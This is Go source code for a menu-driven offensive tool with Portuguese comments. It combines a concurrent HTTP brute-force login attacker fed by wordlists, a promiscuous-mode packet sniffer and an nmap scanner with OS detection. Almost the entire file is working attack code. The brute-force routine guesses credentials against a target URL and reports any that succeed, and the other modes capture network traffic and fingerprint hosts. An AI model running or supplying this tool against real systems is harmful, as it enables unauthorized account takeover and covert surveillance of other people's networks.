package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"github.com/Ullaakut/nmap/v2" // Biblioteca para escaneamento de redes
)

// Estrutura para armazenar as configurações de ataque
type AttackConfig struct {
	TargetURL    string
	Wordlists    map[string]string // Mapa de wordlists para cada campo
	Protocol     string
	CustomFields map[string]string
}

// Função para realizar o ataque de força bruta
func bruteForceAttack(config AttackConfig) {
	var wg sync.WaitGroup
	for field, wordlistPath := range config.Wordlists {
		wg.Add(1)
		go func(field, wordlistPath string) {
			defer wg.Done()
			file, err := os.Open(wordlistPath)
			if err != nil {
				fmt.Printf("Error opening wordlist file for %s: %v\n", field, err)
				return
			}
			defer file.Close()

			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				value := scanner.Text()
				config.CustomFields[field] = value
				if tryLogin(config) {
					fmt.Printf("Credential found! %s: %s\n", field, value)
					return // Retorna assim que encontrar uma credencial válida
				}
			}
			if err := scanner.Err(); err != nil {
				fmt.Printf("Error reading wordlist file for %s: %v\n", field, err)
			}
		}(field, wordlistPath)
	}
	wg.Wait()
}

// Função para tentar login usando as credenciais fornecidas
func tryLogin(config AttackConfig) bool {
	client := &http.Client{}
	req, err := http.NewRequest("GET", config.TargetURL, nil)
	if err != nil {
		fmt.Println("Error creating the request:", err)
		return false
	}

	// Configura a autenticação com as credenciais fornecidas
	q := req.URL.Query()
	for key, value := range config.CustomFields {
		q.Add(key, value)
	}
	req.URL.RawQuery = q.Encode()

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request error:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

// Função para sniffing de pacotes na rede
func packetSniffer(interfaceName string) {
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Error opening device %s for sniffing: %v\n", interfaceName, err)
		return
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		fmt.Println(packet)
	}
}

// Função para escanear redes e sites
func networkMap(target string) {
	scanner, err := nmap.NewScanner(
		nmap.WithTargets(target),
		nmap.WithPorts("80,443"),
		nmap.WithServiceInfo(),
		nmap.WithOSDetection(),
	)
	if err != nil {
		fmt.Printf("Unable to create scanner: %v\n", err)
		return
	}

	result, warnings, err := scanner.Run()
	if err != nil {
		fmt.Printf("Unable to run scanner: %v\n", err)
		return
	}
	if warnings != nil {
		fmt.Printf("Warnings: %v\n", warnings)
	}

	for _, host := range result.Hosts {
		if len(host.Addresses) == 0 {
			continue
		}
		fmt.Printf("Host %q:\n", host.Addresses[0])
		if len(host.Ports) == 0 {
			fmt.Println("No open ports.")
		} else {
			for _, port := range host.Ports {
				fmt.Printf("\tPort %d/%s open\n", port.ID, port.Protocol)
			}
		}
	}
}

func main() {
	fmt.Println("Choose an operation: 1 for Brute Force Attack, 2 for Sniffing, 3 for Network Mapping")
	var choice int
	fmt.Scanln(&choice)

	switch choice {
	case 2:
		fmt.Println("Enter the network interface for sniffing:")
		var interfaceName string
		fmt.Scanln(&interfaceName)
		fmt.Printf("Starting packet sniffing on %s...\n", interfaceName)
		packetSniffer(interfaceName)
	case 3:
		fmt.Println("Enter the target for network mapping:")
		var target string
		fmt.Scanln(&target)
		fmt.Printf("Starting network mapping on %s...\n", target)
		networkMap(target)
	default:
		targetURL := flag.String("url", "http://example.com/login", "URL of the target for the attack")
		flag.Parse()

		config := AttackConfig{
			TargetURL:    *targetURL,
			Wordlists:    make(map[string]string),
			Protocol:     "http",
			CustomFields: make(map[string]string),
		}

		fmt.Println("Enter custom fields and wordlist paths (format: field=path), separated by commas:")
		var fieldsInput string
		fmt.Scanln(&fieldsInput)
		fields := strings.Split(fieldsInput, ",")
		for _, field := range fields {
			parts := strings.Split(field, "=")
			if len(parts) == 2 {
				config.Wordlists[parts[0]] = parts[1]
			}
		}

		fmt.Println(`
                                       __ ,                          
  ,- _~.       ,,          ,,   ,    ,-| ~         ,,                
 (' /|         ||      _   ||  ||   ('||/__,       ||                
((  ||    /'\\ ||/|,  < \, || =||= (( |||  |  /'\\ ||  _-_  \\/\\/\\ 
((  ||   || || || ||  /-|| ||  ||  (( |||==| || || || || \\ || || || 
 ( / |   || || || |' (( || ||  ||   ( / |  , || || || ||/   || || || 
  -____- \\,/  \\/    \/\\ \\  \\,   -____/  \\,/  \\ \\,/  \\ \\ \\ 
                                                                     	
	
Starting a brute force attack...
`)
		bruteForceAttack(config)
	}
}
